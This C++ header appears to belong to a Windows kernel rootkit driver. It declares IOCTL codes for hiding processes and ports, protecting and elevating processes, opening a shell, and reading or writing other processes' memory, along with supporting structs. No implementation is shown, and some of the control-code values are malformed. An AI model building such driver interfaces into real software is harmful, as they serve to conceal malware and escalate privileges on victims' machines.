#pragma once
#pragma once
#include <ntddk.h>
#include "debug.hpp"

#define IOCTL_HIDEPROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666a, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_HIDEPORT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666b, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_PROTPROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666c, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_ELEVPROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666d, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_SHELL    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666e, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IOCTL_GETBUFF  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666f, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

#define IOCTL_ZWPVM    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x786166665a, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_MCVM     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x786166665b, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_ZQIP     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x786166665c, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_ZUVOS    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x786166665d, METHOD_NEITHER, FILE_SPECIAL_ACCESS)


namespace Dispatch
{
    NTSTATUS DriverCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
    NTSTATUS DriverDispatch(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
}

struct PidData {
    UINT32 Pid;
};

struct PortData {
    USHORT Port;
};

struct HideProtocol {
    USHORT LTCP;
    USHORT RTCP;
    USHORT UDP;
};